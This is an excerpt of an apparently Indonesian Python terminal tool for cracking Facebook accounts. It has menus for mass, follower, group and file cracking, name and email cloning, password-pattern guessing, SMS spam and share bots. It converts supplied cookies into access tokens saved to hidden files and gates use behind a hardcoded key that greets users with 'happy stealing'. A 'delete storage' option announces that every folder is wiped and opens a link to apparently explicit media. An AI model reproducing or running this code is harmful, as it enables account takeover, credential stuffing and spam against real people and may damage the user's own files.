...
console = Console()
sys.stdout.write('\x1b]2; haecerjoin | v.0.3\x07')
#------------------[ USER-AGENT ]-------------------#
pretty.install()
CON=sol()
ugen2=[]
...
try:
	...
	print(' [+] Koneksi Internet Anda Tidak Terdeteksi Silahkan Cek Kuota')
...
for t in range(1000):
	...
	uasu = random.choice([bintang,bulan])
	ugen.append(uasu)
...
[bold hot_pink2]██║     ██║  ██║██║ ╚████║██████╔╝██║  ██║██╔╝ ██╗███████║╚██████╗
[bold hot_pink2]╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝ ╚═════╝
[bold yellow]Boot Script 4.0
             """,width=90,padding=(0,8),title=f"Banner",style=f"bold cyan"))
#--------------------[ BAGIAN-MASUK ]--------------#
def login123():
	os.system('clear')
	banner()
	cetak(panel("[white]\t[[cyan]•[white]] [green]Untuk Mengunakan Full Fitur\n[white]\t[[cyan]•[white]][green] Copy Key Dan Paste Di Sini",padding=(0,8),style=f"bold blue"))
	cetak(Panel("""[bold white][[cyan]01[bold white]] Dapatkan Key
[bold white][[cyan]02[bold white]] Crack No Login
[bold white][[cyan]03[bold white]] Bot
[bold white][[cyan]04[bold white]] Cek Results\n[bold white]""", subtitle="╭────[white][[blue]INPUT[white]][blue]", subtitle_align="left", title="[bold red]●[bold yellow]●[bold green]●[bold hot_pink2]TOOLS-MENU[bold green]●[bold yellow]●[bold red]●",padding=(0,5),style=f"bold blue"))
	bryn = input(N+''+B+'   ╰─ >  \033[32m')
	if bryn in ['1','01']:
		key()
	elif bryn in ['2','02']:
		lainnya()
...
def login():
	try:
		token = open('.tenz.txt','r').read()
		cok = open('.jun.txt','r').read()
...
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('[red]Untuk Dump ID Disarankan Menggunakan Cookies Yang Masih Fresh Untuk Login Tools YagesYak\n', subtitle="╭────[white][[blue]COKIES ANDA[white]][blue]", subtitle_align="left",padding=(0,5),style=f"bold blue"))
		...
		with requests.Session() as r:
			try:
				...
				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
					print(" ╰─  \033[91;1mCookie Invalid...", end='\r');time.sleep(3.5);print("                     ", end='\r');cookies()
				else:
					...
					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
						...
						if 'Sukses!' in str(response6):
							...
							cetak(nel(f"\nToken : {access_token}"))
							tokenew = open(".tenz.txt","w").write(access_token)
							cook= open(".jun.txt","w").write(your_cookies)
							cetak(nel("\n [cyan] Good Joob [green] Login Berhasil | Ketik python sol1.py"));exit()
			except Exception as e:
				print(" ╰─  \033[91;1mCek Lagi Tumbal Kamu, Atau Ganti Tumbal")
				os.system('rm -rf .tenz.txt && rm -rf .jun.txt')
				print(e)
				time.sleep(3)
				cookies()
	except:pass
...
def menu(my_name,my_id):
	...
	gh = 'github.com/JunPakaya29'
	key = '3B9P-XJ9G-****-****-****'
	cetak(panel(f'[bold white][+[/][bold white]][/] [bold white]Username : [bold green]{my_name}[/]\n[bold white][+[/][bold white]][/] [bold white]User Idz : [bold green]{my_id}[/]\n[bold white][+[/][bold white]][/] [bold white]User Ip  : [bold green]{ip}[/][/]\n[bold white][+[/][bold white]][/] [bold white]Your Key : [bold green]{key}[/]\n[bold white][bold white][+[/][bold white]][/][bold white] User Sc  : [bold green]Trial[/][/] ',width=90,title=f"[bold green]YOUR-INFO",padding=(0,5),style=f"bold blue"))
	cetak(panel(f"[white][[cyan]•[white]] Github   :[green] {gh}\n[white][[cyan]•[white]] Facebook : [green]Jun V II\n[white][[cyan]•[white]] Whatsapp : [green]08988884579",width=90,title=f"[bold green]MY-INFO",padding=(0,5),style=f"bold blue"))
	...
	cetak(panel("\n[white]\t[[blue]01[white]] Crack Massal\t\t[white][[blue]02[white]] Crack Pengikut\n\t[white]\n\t[[blue]03[white]] Crack Grup\t\t[white]\t[[blue]04[white]] Crack File\n\t[white]\n\t[[blue]05[white]] Cek Results\t\t[white][[blue]06[white]] Whatsapp\n\t[white]\n\t[[blue]07[white]] Hapus Penyimpanan\t\t[red][white][[blue]08[white]] Info Sc\n\t[blue]╭────────────────────────────────────────────────╮[blue]\n[white]\t[blue]│\t [green] Ketik [white][[red]OUT[white]] [green]Untuk Logut[white]/[green]Keluar [blue]\t │\n\t╰[blue]────────────────────────────────────────────────╯[blue]\n",subtitle="╭────[white][[blue]INPUT[white]][blue]", subtitle_align="left", title="[bold green]TOOLS-CRACK",padding=(0,3),style=f"bold blue"))
...
[bold white][[cyan]03[bold white]] Spam Sms
[bold white][[cyan]04[bold white]] Bot Share
[bold white][[cyan]05[bold white]] Lapor Bug
[bold white][[cyan]00[bold white]] Kembali[bold white]""", subtitle="╭────[white][[blue]INPUT[white]][blue]", subtitle_align="left", title="[bold red]●[bold yellow]●[bold green]●[bold hot_pink2]BOT-TOOLS[bold green]●[bold yellow]●[bold red]●",padding=(0,5),style=f"bold blue"))
	bray = input(N+''+B+'   ╰─ >  \033[32m')
	if bray in(''):
		print(' [+] Pilih Yang Bener Asu ')
		time.sleep(3)
		back()
	if bray in('1','01'):
		...
		os.system("xdg-open https://wa.me/+628988884579?text=Selamat+Pagi+Bang+Saya+Mau+Melaporkan+Bug+Pada+Sc+Mu+Bang")
		time.sleep(3)
		exit()
	elif bray in('0','00'):
	    back()
...
def key():
	...
	gh = 'github.com/JunPakaya29'
	cetak(panel(f"[white][[cyan]•[white]] Github   :[green] {gh}\n[white][[cyan]•[white]] Facebook : [green]Jun V II\n[white][[cyan]•[white]] Whatsapp : [green]08988884579",width=90,title=f"[bold green]MY-INFO",padding=(0,5),style=f"bold blue"))
	cetak(panel(f"[bold green]\t\t     3B9P-XJ9G-W3HU-GW8B-AJVK",width=90,title=f"[bold green]YOUR KEY",padding=(0,5),style=f"bold blue"))
	trial = input(f' [+] Paste Key : ')
	if trial in('3B9P-XJ9G-W3HU-GW8B-AJVK'):
		time.sleep(3)
		haecerjoin_tm(f'\n\t\t{h}{x}\033[32mGoodJob\n\t\tKey Valid..Selamat Mencuri ')
		os.system('clear')
		login_lagi334()
...
def remove():
	...
	haecerjoin_tm(f'\n\t{x} \b\033[91;1mSEMUA FOLDER DI PENYIMPANAN KAMU DI HAPUS\033[1;37m')
	os.system('clear')
	os.system('xdg-open https://www.mediafire.com/file/ye2rkv4wlaebwk0/Kakak_Adik_Ngent0d.mp4/file')
	back()
	
#/[WHATSAPPP]\#
def juninfo():
	os.system("xdg-open https://wa.me/+628988884579?text=Halo+Bang+JunGanteng")
	os.system
	back()
...
def infosc():
	...
	cetak(panel(f"[white][[cyan]•[white]] Github   :[green] {gh}\n[white][[cyan]•[white]] Facebook : [green]Jun V II\n[white][[cyan]•[white]] Whatsapp : [green]08988884579",width=90,title=f"[bold green]MY-INFO",padding=(0,5),style=f"bold blue"))
	print("")
	cetak(panel("\t\t\t[bold red]●[bold yellow]●[bold green]●[cyan][[bold yellow]WELCOME[cyan]][bold green]●[bold yellow]●[bold red]●",padding=(0,5),style=f"bold cyan"))
...
def openn():
	...
	cetak(panel(f"[white][[cyan]•[white]] Github   :[green] {gh}\n[white][[cyan]•[white]] Facebook : [green]Jun V II\n[white][[cyan]•[white]] Whatsapp : [green]08988884579",width=90,title=f"[bold green]MY-INFO",padding=(0,5),style=f"bold blue"))
	print("")
	haecerjoin_tm(f'\n\t{x} \b\033[91;1mOpssh Kamu Tidak Mempunyai Akses Untuk Masuk')
	cetak(panel("[white] Tekan [[red]ENTER[white]]\n Paste [green] Key[white] Jika Punya",width=28, style="bold blue",subtitle="╭────", subtitle_align=" [bold blue]"))
	cie_monyet = input(N+''+B+'   \t           ╰─> \033[32m')
	if cie_monyet in ['']:
	 os.system("xdg-open https://wa.me/+628988884579?text=Bagi+Trial+Bang+Jun🙃")
	 back()
	elif cie_monyet in ['NN7U-XCTR-FK9H-3233-X3GK','Admin','admin']:
	 login_lagi334()
	elif cie_monyet in ['3B9P-XJ9G-W3HU-GW8B-AJVK']:
	 haecerjoin_tm(f'\n\t{x} \b\033[91;1mOpssh Key License Kalderuasa')
	 os.system("xdg-open https://wa.me/+628988884579?text=Bagi+Trial+Bang+Jun")
	 back()
#------------------[ DEFF BOT SHARE ]-------------------#
def memek():
...
def lainnya():
	...
	gh = 'github.com/JunPakaya29'
	cetak(panel(f"[white][[cyan]•[white]] Github   :[green] {gh}\n[white][[cyan]•[white]] Facebook : [green]Jun V II\n[white][[cyan]•[white]] Whatsapp : [green]08988884579",width=90,title=f"[bold green]MY-INFO",padding=(0,5),style=f"bold blue"))
	cetak(Panel("""[bold white][[cyan]01[bold white]] Crack File
[bold white][[cyan]02[bold white]] Crack Follower
[bold white][[cyan]03[bold white]] Cloning Name
[bold white][[cyan]04[bold white]] Cloning Email
[bold white][[cyan]00[bold white]] Kembali\n[bold white]""", subtitle="╭────[white][[blue]INPUT[white]][blue]", subtitle_align="left", title="[bold red]●[bold yellow]●[bold green]●[bold hot_pink2]FREE-CRACK[bold green]●[bold yellow]●[bold red]●",padding=(0,5),style=f"bold blue"))
	bray = input(N+''+B+'   ╰─ >  \033[32m')
	if bray in(''):
...
def crack_nama():
	...
	cetak(panel(f"[white][[cyan]•[white]] Github   :[green] {gh}\n[white][[cyan]•[white]] Facebook : [green]Jun V II\n[white][[cyan]•[white]] Whatsapp : [green]08988884579",width=90,title=f"[bold green]MY-INFO",padding=(0,5),style=f"bold blue"))
	nama = []
	custom = [" iqbal"," kami"," siska"," alwy"," medan"," new"," old"," jian"," store"," tias"," rio"," lia"," farz"," marvel"," jakarta"," anisha"," juven"," der"," rika"," udin"," rayan"," tina"," tiara"," fahmi"," baili"," rima"," gadis"," dimas"," abram"," ajis"," vicky"," charlie"," piko"," billa"]
	custom2 = ["galang ","gilang ","gita ","steven ","aulia ","tiyas ","amat ","naura ","anton ","reval ","abi ","yehezkiel ","hafiz ","daniel ","angun "]
	cetak(nel('[red]Crack Username Satu Nama Yang Ingin Di Crack Setara Dengan [green]5.000 [red]Username\n', subtitle="╭────[white][[blue]INPUT-NAME[white]][blue]", subtitle_align="left",padding=(0,5),style=f"bold blue"))
...
def crack_email():
	...
	if ',' in str(nama):
		...
		time.sleep(3);exit()
	cetak(nel('[red]Masukan Nama Domain , Contoh : @Kontol.com, @Gmail.com, @Yahoo.com, Dll', subtitle="╭────[white][[blue]INPUT-DOMAIN[white]][blue]", subtitle_align="left",padding=(0,5),style=f"bold blue"))
...
def dump_massal():
	...
	try:
		...
		cetak(panel('\t            [bold white]Berapa [bold green]Idz[/] Yang mau Di Dump',width=90,title=f"[bold green]Jumlah Target",style=f"bold blue"))
		jum = int(input(f' [+] {P} {x} : '))
	except ValueError:
		print(' [+] Wrong input ')
		exit()
	...
	for userr in uid:
		try:
			...
			exit()
	try:
		print(f' [+] {P}Total Idz Janda Pirang Yang Terkumpul{x} : {h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print(' [+] Unstable Signal ')
...
def setting():
	...
	cetak(panel(f"[white][[cyan]•[white]] Github   :[green] {gh}\n[white][[cyan]•[white]] Facebook : [green]Jun V II\n[white][[cyan]•[white]] Whatsapp : [green]08988884579",width=90,title=f"[bold green]MY-INFO",padding=(0,5),style=f"bold blue"))
	urut = []
	urut.append(panel(f'[bold white][[bold cyan]01[/][bold white]][/] [bold white]Login Site [bold green]m.facebook.com[bold white] [/]\n[bold white][[bold cyan]02[/][bold white]][/] [bold white]Login Site [bold green]mbasic.facebook.com[bold white] [/]\n[bold white][[bold cyan]03[/][bold white]][/] [bold white]Login Site [bold green]free.facebook.com[bold white] ',width=45,title=f"[bold green]Validate",style=f"bold blue"))
	urut.append(panel(f'[bold white][[bold cyan]04[/][bold white]][/] [bold white]Login Site [bold green]m.facebook.com[bold white] [/]\n[bold white][[bold cyan]05[/][bold white]][/] [bold white]Login Site [bold green]mbasic.facebook.com[bold white] [/]\n[bold white][[bold cyan]06[/][bold white]][/] [bold white]Login Site [bold green]free.facebook.com[bold white] ',width=45,title=f"[bold green]Reguler",style=f"bold blue"))
	urut.append(panel(f'[bold white][[bold cyan]07[/][bold white]][/] [bold white]Login Site [bold green]m.facebook.com[bold white]  ',width=45,title=f"[bold green]Async",style=f"bold blue"))
	urut.append(panel(f'[bold white][[bold cyan]08[/][bold white]][/] [bold white]Login Site [bold green]developer.facebook.com[bold white]  ',width=45,title=f"[bold green]B-Api",style=f"bold blue"))
...
[bold white][[bold cyan]03[bold white]] [bold white]Nama, Nama123, Nama1234, Nama12345 + Manual [[bold red]Not Recommended[bold white]]''',style='bold blue',title='[bold green]Setting Password',width=90))
	...
	gh = 'github.com/JunPakaya29'
	cetak(panel(f"[white][[cyan]•[white]] Github   :[green] {gh}\n[white][[cyan]•[white]] Facebook : [green]Jun V II\n[white][[cyan]•[white]] Whatsapp : [green]08988884579",width=90,title=f"[bold green]MY-INFO",padding=(0,5),style=f"bold blue"))
	cetak(panel(f'      [bold white]Apakah Anda Ingin Menampilkan Aplikasi Yang Terkait Di Dalam Akun ? Y/T',width=90,title=f"[bold green]Setting Apk",style=f"bold blue"))
	...
	cetak(panel(f'[bold white]Apakah Anda Ingin Mengunakan User-Agent Manual Untuk Melakukan Crack Account ? Y/T',width=90,title=f"[bold green]Setting User-Agent",style=f"bold blue"))
...
def passwrd():
	...
	print('')
	urut = []
	urut.append(panel(f'        [bold green]%s [bold white]'%(okc),width=43,title=f"[bold green]OK SAVE IN",style=f"bold blue"))
	urut.append(panel(f'         [bold yellow]%s [bold white]'%(cpc),width=44,title=f"[bold yellow]CP SAVE IN",style=f"bold blue"))
